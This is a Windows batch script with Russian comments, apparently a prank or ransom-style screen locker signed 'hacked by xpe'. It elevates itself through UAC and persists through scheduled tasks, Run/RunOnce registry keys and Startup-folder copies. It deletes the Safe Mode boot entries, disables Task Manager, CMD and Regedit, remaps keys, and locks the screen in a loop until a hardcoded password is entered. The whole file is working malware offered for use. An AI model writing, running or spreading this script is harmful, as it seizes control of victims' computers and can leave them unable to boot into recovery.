@echo off
:: ============================================================
:: Проверка прав администратора
:: ============================================================
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Запрос прав администратора...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: ============================================================
:: Отображение сообщения "hacked by xpe"
:: ============================================================
cls
color 0C
echo.
echo  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗     ██████╗ ██╗   ██╗    ██╗  ██╗██████╗ ███████╗
echo  ╚██╗██╔╝██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔══██╗██╔════╝
echo   ╚███╔╝ ███████║██║     ███████║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝      ╚███╔╝ ██████╔╝█████╗  
echo   ██╔██╗ ██╔══██║██║     ██╔══██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝       ██╔██╗ ██╔══██╗██╔══╝  
echo  ██╔╝ ██╗██║  ██║╚██████╗██║  ██║███████╗██████╔╝    ██████╔╝   ██║       ██╔╝ ██╗██║  ██║███████╗
echo  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
echo.
echo  hacked by xpe
echo.
timeout /t 3 /nobreak >nul

:: ============================================================
:: Создание задачи планировщика для автозапуска при входе
:: ============================================================
schtasks /create /tn "SystemUpdate" /tr "\"%~f0\"" /sc onlogon /rl highest /f >nul 2>&1

:: ============================================================
:: Создание задачи планировщика для автозапуска при включении
:: ============================================================
schtasks /create /tn "SystemBoot" /tr "\"%~f0\"" /sc onstart /rl highest /f >nul 2>&1

:: ============================================================
:: Добавление в реестр Run ключей
:: ============================================================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SysUpdate" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SysUpdate" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1

:: ============================================================
:: Создание ярлыка в автозагрузке
:: ============================================================
set "startupAll=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
set "startupUser=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy /Y "%~f0" "%startupAll%\SysUpdate.bat" >nul 2>&1
copy /Y "%~f0" "%startupUser%\SysUpdate.bat" >nul 2>&1

:: ============================================================
:: Отключение безопасного режима (удаление записей реестра)
:: ============================================================
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /f >nul 2>&1

:: ============================================================
:: Отключение Task Manager, CMD, Regedit
:: ============================================================
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul 2>&1

:: ============================================================
:: Блокировка клавиш (Ctrl+Alt+Del, Win, Alt+Tab, Esc)
:: ============================================================
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d 00000000000000000300000000005BE000005CE0000038E000000000 /f >nul 2>&1

:: ============================================================
:: Бесконечный цикл блокировки экрана
:: ============================================================
:LOCKLOOP
cls
color 0C
echo.
echo  ============================================
echo  =       СИСТЕМА ЗАБЛОКИРОВАНА             =
echo  ============================================
echo.
echo  Введите пароль для разблокировки:
echo.
set /p "pass=> "
if "%pass%"=="0159" goto UNLOCK

echo.
echo  Неверный пароль. Система остается заблокирована.
echo.
timeout /t 2 /nobreak >nul
goto LOCKLOOP

:UNLOCK
:: ============================================================
:: Разблокировка: удаление задач, ключей реестра, ярлыков
:: ============================================================
schtasks /delete /tn "SystemUpdate" /f >nul 2>&1
schtasks /delete /tn "SystemBoot" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SysUpdate" /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "SysUpdate" /f >nul 2>&1
del /f /q "%startupAll%\SysUpdate.bat" >nul 2>&1
del /f /q "%startupUser%\SysUpdate.bat" >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v "Scancode Map" /f >nul 2>&1
cls
color 0A
echo.
echo  ============================================
echo  =      СИСТЕМА РАЗБЛОКИРОВАНА            =
echo  ============================================
echo.
timeout /t 2 /nobreak >nul
exit